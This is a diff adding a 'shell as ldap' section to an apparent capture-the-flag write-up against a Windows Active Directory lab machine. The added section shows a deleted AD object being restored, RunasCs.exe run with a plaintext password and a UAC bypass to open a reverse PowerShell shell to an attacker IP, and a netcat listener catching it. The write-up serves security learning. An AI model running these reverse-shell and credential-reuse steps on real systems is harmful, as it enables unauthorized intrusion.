@@ -578,6 +578,52 @@ objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110
 PS C:\Windows\system32> 
 
 ```
+
+## shell as ldap
+
+```
+PS C:\Windows\system32> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
+Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
+```
+
+```
+PS C:\tmp> ls
+ls
+
+
+    Directory: C:\tmp
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         10/6/2026  10:12 AM          51712 RunasCs.exe                                                          
+
+
+PS C:\tmp> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.15.74:4444 --bypass-uac
+.\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.15.74:4444 --bypass-uac
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-c9536$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3280 created in background.
+PS C:\tmp> 
+
+```
+
+```
+rlwrap -cAr nc -lvnp 4444                                  
+listening on [any] 4444 ...
+connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 53668
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> whoami
+whoami
+voleur\todd.wolfe
+PS C:\Windows\system32> 
+
+```
 ---
 ## Privilege Escalation
 
